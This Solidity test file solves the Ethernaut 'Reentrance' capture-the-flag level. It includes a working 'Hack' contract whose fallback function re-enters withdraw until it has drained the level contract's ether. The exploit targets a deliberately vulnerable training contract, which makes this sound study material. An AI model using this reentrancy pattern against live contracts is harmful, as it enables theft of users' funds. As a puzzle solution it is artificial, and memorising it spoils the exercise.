pragma solidity ^0.8.10;

import "ds-test/test.sol";
// import "../Reentrance/ReentranceHack.sol";
import "../Reentrance/ReentranceFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract ReentranceTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 10 ether);
    }

    function testReentranceHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        ReentranceFactory reentranceFactory = new ReentranceFactory();
        ethernaut.registerLevel(reentranceFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(reentranceFactory);
        Reentrance ethernautReentrance = Reentrance(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        ethernautReentrance.donate{value:1 ether}(address(101));
        ethernautReentrance.donate{value:1 ether}(address(102));
        ethernautReentrance.donate{value:1 ether}(address(103));
        ethernautReentrance.donate{value:1 ether}(address(104));

        Hack hack = new Hack(address(ethernautReentrance));
        hack.attack{value:1 ether}();
        
        assertEq(address(hack).balance, 6 ether);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
} 
contract Hack {
    IReentrance reentrance;
    constructor(address _reentrance) {
        reentrance = IReentrance(_reentrance);
    }

    function attack() public payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(1 ether);
    }

    fallback() external payable {
        if (address(reentrance).balance >= 1 ether) {
            reentrance.withdraw(1 ether);
        }
    }
}